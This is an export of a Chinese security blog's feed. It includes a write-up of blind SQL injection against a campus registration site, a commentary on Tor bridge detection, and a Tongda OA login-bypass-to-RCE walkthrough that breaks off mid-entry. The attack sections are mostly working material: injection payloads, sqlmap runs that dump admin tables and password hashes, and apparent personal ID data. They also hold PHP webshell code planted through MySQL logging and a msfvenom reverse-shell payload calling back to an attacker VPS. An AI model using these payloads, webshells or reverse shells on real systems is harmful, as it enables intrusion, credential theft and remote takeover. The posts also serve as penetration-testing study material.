        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" data-hmacdigest="adb1986db1bde7509ff52d863a512055a307eeabcfa2b974eef36fef74b624bf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
            <tag> Proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对校园内FTP服务器的一次渗透测试</title>
      <link href="2020/10/15/campusFTP/"/>
      <url>2020/10/15/campusFTP/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" data-hmacdigest="0c611c5d082c8bcd49198c853a41af118c9b80757b1b3cabdc3d8e7f6e4acd98"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 校园网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园内某报名系统出现SQL盲注漏洞</title>
      <link href="2020/09/19/campusSqli/"/>
      <url>2020/09/19/campusSqli/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-jwzsb报名系统"><a href="#0x00-jwzsb报名系统" class="headerlink" title="0x00 jwzsb报名系统"></a>0x00 jwzsb报名系统</h2><p>最开始是对jwzsb.xxx.edu.cn这个网站进行了分析，后来发现另一个网站 zpbm.xxx.edu.cn与jwzsb用的是同一套Web管理系统。对zpbm的登录数据包进行了分析，发现了一个注入点，是<em>基于时间的SQL盲注</em>漏洞。可以凭借此漏洞获取数据库的全部数据。在发现该漏洞后，发现操作数据库的权限较低，只能查询，而不能进行其他操作。所以无法直接利用SQL注入操作DBMS来进一步渗透至（Linux）操作系统。</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/12/BzqvXF.png"  alt="zsb"></p><p>登录POST数据包：</p><pre><code class="http">POST /admin/alogin_chk.php HTTP/1.1Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://jwzsb.xxx.edu.cn/Cookie: PHPSESSID=2fa4b256b9f62528cf8b5892c8754869Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip,deflateContent-Length: 107Host: jwzsb.xxx.edu.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoConnection: Keep-aliveapassword=g00dPa%24%24w0rD&amp;auserid=0&#39;XOR(if(now()=sysdate()%2Cslee</code></pre><p>由于发现此报名系统的漏洞，便立马报告给校方了，学校立马关闭了这个网站，这导致了后面写这篇文章的时候无法复现漏洞。</p><p>不过下面的zpbm这个站还有记录。</p><h2 id="0x01-zpbm注入分析"><a href="#0x01-zpbm注入分析" class="headerlink" title="0x01 zpbm注入分析"></a>0x01 zpbm注入分析</h2><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/12/BzLp79.png"  alt="zpbm"></p><p>登录POST数据包：</p><pre><code class="http">POST /login_chk.php HTTP/1.1Host: zpbm.xxx.edu.cnContent-Length: 69Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0Origin: http://zpbm.xxx.edu.cnContent-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://zpbm.xxx.edu.cn/login.phpAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSID=83ee0d6b80269f465a0daa50bd3ad8c2Connection: closejuserid=420104199804103057&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95</code></pre><p>发送原始数据包，响应包立马返回到了客户端</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/12/Bzqzm4.png"  alt="3"></p><p>发送带有Payload的数据包，服务端会等个5秒后再给客户端返回响应包。可以看到这个时间：</p><p><img src="/" class="lazyload" data-src="https://s3.ax1x.com/2020/11/12/BzLS0J.png"  alt="4"></p><p>Payload：</p><pre><code class="sql">juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95</code></pre><p>可以看出问题出现在参数<code>juserid</code>上，使用<code>&#39;)</code>闭合前面的<code>(&#39;</code>。后面的<code>AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg)</code>其中的<code>SLEEP(5)</code>便是基于时间的SQL盲注漏洞测试中常用的一个函数。再之后的参数是安全的</p><pre><code class="sql">(&#39;juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&#39;)&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95</code></pre><h2 id="0x02-数据库枚举"><a href="#0x02-数据库枚举" class="headerlink" title="0x02 数据库枚举"></a>0x02 数据库枚举</h2><h3 id="枚举当前用户"><a href="#枚举当前用户" class="headerlink" title="枚举当前用户"></a>枚举当前用户</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid --current-user[*] starting @ 01:17:14 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[01:17:14] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[01:17:14] [INFO] fetching current user[01:17:14] [INFO] resuming partial value: \\x04A[01:17:14] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 1134 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),3,1))&gt;64,0,5)))))zBMz) AND (&#39;txfM&#39;=&#39;txfM[01:17:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)[01:26:27] [INFO] retrieved:  Auser@localhost[01:26:27] [DEBUG] performed 125 queries in 553.43 secondscurrent user: &#39;\\x04Auser@localhost&#39;[*] ending @ 01:26:27 /2020-09-19/</code></pre><h3 id="枚举DBMS用户"><a href="#枚举DBMS用户" class="headerlink" title="枚举DBMS用户"></a>枚举DBMS用户</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid --users                          [*] starting @ 19:30:08 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95---[19:30:08] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[19:30:08] [INFO] fetching database users[19:30:08] [INFO] fetching number of database users[19:30:08] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)         [19:30:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 1[19:30:19] [INFO] retrieved: &#39;rsuser&#39;@&#39;localhost&#39;database management system users [1]:[*] &#39;rsuser&#39;@&#39;localhost&#39;[*] ending @ 19:42:32 /2020-09-19/</code></pre><h3 id="枚举当前数据库以及探测DBA"><a href="#枚举当前数据库以及探测DBA" class="headerlink" title="枚举当前数据库以及探测DBA"></a>枚举当前数据库以及探测DBA</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v3 --current-db --is-dba [*] starting @ 01:30:36 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[01:30:36] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[01:30:36] [INFO] fetching current database[01:30:36] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 2939 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;64,0,5)))))pbwD) AND (&#39;ugmQ&#39;=&#39;ugmQ[01:30:36] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)[01:33:07] [INFO] retrieved: zpbm[01:33:07] [DEBUG] performed 32 queries in 151.27 secondscurrent database: &#39;zpbm&#39;[01:33:07] [INFO] testing if current user is DBA[01:33:07] [INFO] fetching current user[01:33:07] [INFO] resumed: \\x04Auser@localhost[01:33:07] [DEBUG] performed 0 queries in 0.00 seconds[01:33:07] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 3791 FROM (SELECT(SLEEP(5-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x044175736572 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,5)))))DVpF) AND (&#39;eZLv&#39;=&#39;eZLvcurrent user is DBA: False[*] ending @ 01:33:07 /2020-09-19/</code></pre><h3 id="枚举zpbm数据库中的表"><a href="#枚举zpbm数据库中的表" class="headerlink" title="枚举zpbm数据库中的表"></a>枚举<code>zpbm</code>数据库中的表</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v3 -D zpbm --tables[*] starting @ 01:39:26 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[01:39:26] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[02:23:15] [INFO] retrieved: zzmm_tb[02:23:15] [DEBUG] performed 50 queries in 241.85 secondsDatabase: zpbm[10 tables]+------------+| admuser    || basedata   || examadd    || hunying_tb || juser      || nation_tb  || xlxw_tb    || ypgw_tb    || zpry       || zzmm_tb    |+------------+[*] ending @ 02:23:15 /2020-09-19/</code></pre><h3 id="枚举admuser表中的所有字段"><a href="#枚举admuser表中的所有字段" class="headerlink" title="枚举admuser表中的所有字段"></a>枚举<code>admuser</code>表中的所有字段</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser --columns[*] starting @ 19:35:48 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[19:35:50] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12Database: zpbmTable: admuser[11 columns]+-------------+------------+| Column      | Type       |+-------------+------------+| aclass      | tinyint(4) || aLlogIP     | char(40)   || aLlogtime   | datetime   || aLogcount   | int(11)    || aname       | char(20)   || apassword   | char(40)   || aRegIP      | char(40)   || aRegtime    | datetime   || auserid     | char(10)   || mobilephone | char(20)   || officephone | char(20)   |+-------------+------------+[*] ending @ 19:35:50 /2020-09-19/</code></pre><h3 id="dump-zpbm数据库中的admuser表中的auserid字段"><a href="#dump-zpbm数据库中的admuser表中的auserid字段" class="headerlink" title="dump zpbm数据库中的admuser表中的auserid字段"></a>dump <code>zpbm</code>数据库中的<code>admuser</code>表中的<code>auserid</code>字段</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser -C auserid --dump[*] starting @ 21:34:45 /2020-09-19/---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[21:34:45] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[21:34:45] [INFO] fetching entries of column(s) &#39;auserid&#39; for table &#39;admuser&#39; in database &#39;zpbm&#39;[21:34:45] [INFO] fetching number of column(s) &#39;auserid&#39; entries for table &#39;admuser&#39; in database &#39;zpbm&#39;[21:34:45] [INFO] resumed: 5[21:34:45] [DEBUG] performed 0 queries in 0.00 seconds[21:41:40] [DEBUG] analyzing table dump for possible password hashesDatabase: zpbmTable: admuser[5 entries]+---------+| auserid |+---------+| adm     || cs1     || cs2     || fs      || nhc     |+---------+[*] ending @ 21:41:40 /2020-09-19/</code></pre><h3 id="dump密码字段"><a href="#dump密码字段" class="headerlink" title="dump密码字段"></a>dump密码字段</h3><pre><code class="bash">$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser -C apassword --dump[*] starting @ 19:54:25 /2020-09-19/sqlmap resumed the following injection point(s) from stored session:---Parameter: juserid (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---[19:54:26] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0.12[19:54:26] [INFO] fetching entries of column(s) &#39;apassword&#39; for table &#39;admuser&#39; in database &#39;zpbm&#39;[19:54:26] [INFO] fetching number of column(s) &#39;apassword&#39; entries for table &#39;admuser&#39; in database &#39;zpbm&#39;[19:54:26] [INFO] resumed: 5[19:54:26] [DEBUG] performed 0 queries in 0.00 seconds[21:27:56] [INFO] recognized possible password hashes in column &#39;apassword&#39;[21:32:25] [DEBUG] post-processing table dumpDatabase: zpbmTable: admuser[5 entries]+----------------------------------+| apassword                        |+----------------------------------+| 2bcfc22a73d585e36d42d60ccbf04988 || 4380ee904cccde365ea8166ca95056a7 || 4a79f79abec0e1939591d5db8a6cd565 || 97422bab517d948a90db09345d244433 || af9d6e46767861dfb0a0c3387764599d |+----------------------------------+[*] ending @ 21:32:25 /2020-09-19/</code></pre><p>原本只对admuser表进行了枚举爆破，因为猜测admuser表应该是管理员用户表，所以拿它开刀。然而发现这张表上的用户并不能登录此系统（后续又在zpmb网站上发现了另一个管理员的登录入口）。所以便继续枚举了另一张juser表中的部分字段，并对MD5加密的hash进行了解密，发现确实可以拿报名用户的用户名密码登录至此系统。</p><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><p>使用PHP的过滤字符串函数，对恶意用户输入的特殊字符串进行严格过滤。</p><p>过滤SQL注入的函数：</p><ul><li>addslashes()</li><li>mysql_escape_string()</li><li>mysqli_real_escape_string()</li></ul><p>没想到的是学校把这两个站直接关闭了。。。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Tor近期的两个0day漏洞在天朝的影响</title>
      <link href="2020/08/04/tor-0days/"/>
      <url>2020/08/04/tor-0days/</url>
      
        <content type="html"><![CDATA[<blockquote><p>几天前（30 July 2020），安全研究员Neal Krawetz博士表示，Tor Project一直没有解决他在过去几年中报告的一些安全问题，所以他决定公开披露两个关于Tor的0day漏洞详细技术信息。</p><p>同时他还承诺将会再透露至少三个关于Tor的0day漏洞，其中一个可以显示Tor服务器的真实IP地址。当然了，这也是后话，本文着重讨论其已经披露两个安全问题。</p></blockquote><h1 id="漏洞摘要信息"><a href="#漏洞摘要信息" class="headerlink" title="## 漏洞摘要信息"></a>## 漏洞摘要信息</h1><h2 id="直接连接检测阻止"><a href="#直接连接检测阻止" class="headerlink" title="### 直接连接检测阻止"></a>### 直接连接检测阻止</h2><p>Neal Krawetz在其博客上发表的一篇文章（<a href="https://www.hackerfactor.com/blog/index.php?/archives/888-Tor-0day-Stopping-Tor-Connections.html">https://www.hackerfactor.com/blog/index.php?/archives/888-Tor-0day-Stopping-Tor-Connections.html</a>）披露了第一个安全问题。</p><p>这篇文章开头吐槽了其给一些公司报告漏洞，公司的响应不及时、不周到以及表现出敷衍的态度。</p><p>随后便开始吐槽起Tor Project了。几年前的一个关于<strong>Tor浏览器滚动条宽度会被攻击者识别底层操作系统</strong>的安全问题。</p><p>之后他谈论到了正题，第一个安全问题的详细技术信息。</p><p>简而言之，公司、服务提供商以及国家政府可以通过扫描网络连接，以查找Tor流量的**<em>独特数据包签名</em>（distinct packet signature）**来阻止用户连接到Tor网络。从而使用户无法绕过网络审查。</p><h2 id="间接连接检查阻止"><a href="#间接连接检查阻止" class="headerlink" title="### 间接连接检查阻止"></a>### 间接连接检查阻止</h2><p><strong>间接连接</strong>，也就是一些被网络封锁审查的地区中用户无法直连Tor网络。他们得需要通过<strong>Tor网桥（bridges）</strong>才能连接到Tor网络入口节点进行匿名化。</p><p>Tor网桥，即<strong>可插拔传输器（Pluggable Transports）</strong>有好几种：</p><ul><li>obfs4</li></ul><p>obfs4 使 Tor 的流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 与之前的 obfs3 网桥相比，obfs4 网桥被阻塞的可能性较小。</p><ul><li>meek</li></ul><p>meek 依赖的这几个云计算平台都是大公司（亚马逊、微软）提供的，使您看起来像在浏览主要网站，而不是使用 Tor。 meek-azure 使您看起来像在使用 Microsoft 网站。</p><ul><li>snowflake</li></ul><p>Snowflake 是对 Flashproxy 的改进。 它通过WebRTC发送您的流量，WebRTC 是一种具有内置网络地址转换穿透的对等（P2P）协议。</p><p><img src="/" class="lazyload" data-src="https://miro.medium.com/max/831/1*W1N6X3ITbXiwZNUaxC0hsA.png"  alt="内置网桥obfs4与meek-azure"></p><p><img src="/" class="lazyload" data-src="https://miro.medium.com/max/831/1*0uVjRr9slMDz-ZcIL79Tkw.png"  alt="手动去Tor BridgeDB申请的桥"></p><p>而根据其发表的第二篇博文（<a href="https://www.hackerfactor.com/blog/index.php?/archives/889-Tor-0day-Burning-Bridges.html">https://www.hackerfactor.com/blog/index.php?/archives/889-Tor-0day-Burning-Bridges.html</a>）介绍了识别Tor网桥流量的方法，包括两个0day漏洞。一个是针对obfs4的，另一个是针对meek网桥的。</p><p>具体技术细节可以详见此博文……</p><p>如若网桥流量如果被真正地检测出来了，那么也就表明通过网桥连接到Tor匿名网络的人将会受到直接监视（监视者知道位于这个公网IP地址的人正在尝试使用Tor网桥来连接至Tor网络进行匿名化）。</p><h1 id="争议性"><a href="#争议性" class="headerlink" title="## 争议性"></a>## 争议性</h1><p>在Neal Krawetz发表博文之后，Tor Project没有通过私人渠道答复Krawetz，而是通过推特公开回应了他的那两篇博文。</p><blockquote><p>NEW: People have asked us about a series of bugs that are being publicized and incorrectly labeled as 0-days. Whenever we are notified of high-risk security bugs, we will, as always, address these issues and release formal responses so you know what’s happening.</p><footer><strong>@torproject</strong><cite><a href="https://twitter.com/torproject/status/1288955073322602496">twitter.com/torproject/status/1288955073322602496</a></cite></footer></blockquote><p>Tor Project表明，他们知道Neal Krawetz报告的安全问题。上周的两个报告（也就是第一篇博文）并不是什么新鲜事物，而后一篇博文中谈论的两个所谓的0day漏洞值得探讨，但几乎没有证据表明它们可以大规模地工作。并且Tor Project不同意Krawetz博文中关于对漏洞作为0day的称呼。</p><p>两日后（2 August 2020），Krawetz也对Tor Project发表的声明进行来辩论：</p><p><a href="https://www.hackerfactor.com/blog/index.php?/archives/890-Tor-0day-Replying-to-the-Tor-Project.html">https://www.hackerfactor.com/blog/index.php?/archives/890-Tor-0day-Replying-to-the-Tor-Project.html</a></p><p>……</p><h1 id="天朝会有影响吗？"><a href="#天朝会有影响吗？" class="headerlink" title="## 天朝会有影响吗？"></a>## 天朝会有影响吗？</h1><p>答案当然是：<strong>没有。</strong></p><p>在我近期少有的几次尝试中发现，在天朝GFW的干扰下，不光是无法直接连接到Tor网络，而且也无法直接连接到网桥至Tor网络。</p><p>也就是说<strong>天朝用户无法直连Tor网络，也无法通过网桥连接上Tor网络。</strong></p><p>这个地方的现象证实了Tor Project不认同那两个漏洞作为0day称呼的说法。那位博士所述的那些关于Tor网络以及网桥流量可被检测的“0day漏洞”在这里、在GFW结合使用主动扫描、深度数据包检测之下早已经成了「<strong>既定事实」</strong>，哪里称得上是0day未知漏洞。</p><p>或许在此前（一年前）可以通过obfs4或者meek连接上。但是目前不行，当然或许也只是我没测试成功。</p><p>但其实我更想说的是，<strong>无法直连或者无法直接通过网桥来连上Tor网络未必是坏事情</strong>。</p><p>一般来说，都是在Tor流量或网桥流量前套一层shadowsocks的前置代理流量。对Tor和网桥流量再进行一层流量加密。使得网络流量更加具有<strong>保密性（Confidenciality）。</strong></p><p>当然了，shadowsocks也会存在问题。</p><p>例如“协议可以被识别？”（威胁建模，假定认同）。不过被识别也只是会被监视者认为是普通翻墙流量。</p><p>虽说可以被识别，但还是依然认为其加密是靠谱的，至少中间人解不出明文信息。然而，前几个月（ 2020年02月28日）shadowsocks被披露出「steam加密存在漏洞，导致数据包头部可被修改」。<strong>攻击者可利用修改过后的数据包进行「重定向」，从而进行中间人攻击</strong>。</p><p>虽说shadowsocks也会有很大的问题，但是就目前而言。此方案（<strong>Tor over Shadowsocks，即在Tor网桥流量前套一层shadowsocks的前置代理流量</strong>）仍然足够靠谱！</p>]]></content>
      
      
      
        <tags>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从任意登录RCE到入门Cobalt Strike后渗透</title>
      <link href="2020/05/09/Arblogin-RCE-PostPen/"/>
      <url>2020/05/09/Arblogin-RCE-PostPen/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一次真实的渗透测试，主要是打算漏洞复现通达OA的这个洞。然后随便入门学习了后渗透神器CS的使用。</p></blockquote><h2 id="0x00-通达OA任意登录"><a href="#0x00-通达OA任意登录" class="headerlink" title="0x00 通达OA任意登录"></a>0x00 通达OA任意登录</h2><p>前段时间通达OA曝出前台任意用户登录，两个版本会受到影响。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>服务端只取了整型递增<code>UID</code>来做用户身份鉴别，从而可登录指定<code>UID</code>的用户（包括管理员admin用户）。</p><h4 id="v2017"><a href="#v2017" class="headerlink" title="v2017"></a>v2017</h4><ol><li>POST<code>/logincheck.php</code>，并增加一个可控的参数UID。响应包中会有UID为1的admin用户的PHPSESSID。</li></ol><p> class="lazyload" data-src="https://i.loli.net/2020/05/09/bPmOCMgtoczT1e8.png" <img src="/"></p><ol start="2"><li>使用此PHPSESSID直接请求<code>/general/index.php</code>就可以登录admin用户了。</li></ol><p> class="lazyload" data-src="https://i.loli.net/2020/05/09/NlrgFfsOPbSWExa.png" <img src="/"></p><h4 id="v11-4"><a href="#v11-4" class="headerlink" title="v11.4"></a>v11.4</h4><ol><li>GET请求<code>/general/login_code.php</code>，响应包会返回一个CODEUID。 </li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/EwdRlhgqMQHIry9.png"  alt="login_code.png"></p><ol start="2"><li>POST请求<code>/logincheck_code.php</code>，带上刚刚返回的CODEUID参数（CODEUID是为了绕过if条件的exit()）并增加一个可控的参数UID，赋值变量UID为1，从而控制该SQL语句返回的结果为USER表中UID为1的用户信息（默认UID为1的用户是管理员admin）；发送数据包，响应包头会返回admin用户的PHPSESSID。</li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/1adOrfv8ZQF9zMo.png"  alt="logincheck.png"></p><ol start="3"><li>使用此PHPSESSID就可以登录admin用户了。</li></ol><p> class="lazyload" data-src="https://i.loli.net/2020/05/09/98bDhXTHsrENGuI.png" <img src="/"></p><h2 id="0x01-远程代码执行"><a href="#0x01-远程代码执行" class="headerlink" title="0x01 远程代码执行"></a>0x01 远程代码执行</h2><p>由前边的任意登录，进去后可以得知web根目录。</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/5Qo1T6C3KDqAx9Z.png"  alt="webroot.png"></p><p>登录了后台管理权限以及知道了根目录绝对路径就可以利用MySQL日志进一步写shell了。直接用脚本来写shell后门。</p><p>EXP来源于<strong>zrools</strong>：<a href="https://github.com/zrools/tools">https://github.com/zrools/tools</a></p><p>脚本上传webshell代码：</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/CkpMQ63hJXTOLle.png"  alt="function.png"></p><p>以上base64解密后如下，即通过MySQL日志写shell：</p><pre><code class="mysql">set global general_log=&#39;on&#39;;set global general_log_file=&#39;MYOA_WEBSHELL&#39;;select &quot;&lt;?php $command=$_GET[&#39;cmd&#39;];$wsh = new COM(&#39;WScript.shell&#39;);$exec = $wsh-&gt;exec(&#39;cmd /c &#39;.$command); $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt;&quot;;set global general_log=&#39;off&#39;;</code></pre><p>执行脚本会得到一个shell，直接是system权限。</p><pre><code class="bash"># python3 tongda_v11.4_rce_exp.pywebroot:  D:\\MYOA\\webrootcookies:  PHPSESSID=sdtpt1h45no9th2lt7d1j0vtl5webshell: (GET) http://*.*.*.*:8008/api/test.php?cmd=ipconfig</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/nwPNb5CZgQJK2rt.png"  alt="whoami.png"></p><p>不过，此方式是接收GET参数的webshell，不太方便后续渗透。</p><p>所以可以简单修改成一个接收POST参数的马，然后连接菜刀或者蚁剑。</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/Dl6dM3mufEcUwk4.png"  alt="antsword.png"></p><p>执行命令还是SYSTEM权限，未开启disable_functions。</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/BPm1bp2IRxrguLE.png"  alt="system.png"></p><h2 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02 后渗透测试"></a>0x02 后渗透测试</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="反弹Meterpreter"><a href="#反弹Meterpreter" class="headerlink" title="反弹Meterpreter"></a>反弹Meterpreter</h4><p>生成木马（LHOST为我的VPS公网地址）：</p><pre><code class="bash"># msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=4444 -f exe -o shell.exe</code></pre><p>在VPS上可以使用screen会话恢复工具：</p><pre><code class="bash"># screen -S MSF</code></pre><p>MSF侦听：</p><pre><code class="bash"># msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 172.16.123.89; exploit -j&quot;[*] Exploit running as background job 1.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 172.16.123.89:4444</code></pre><p>将之前生成的MSF木马通过蚁剑上传只服务器，然后在Terminal中执行。VPS MSF这儿就会就收到一个<code>meterpreter</code> 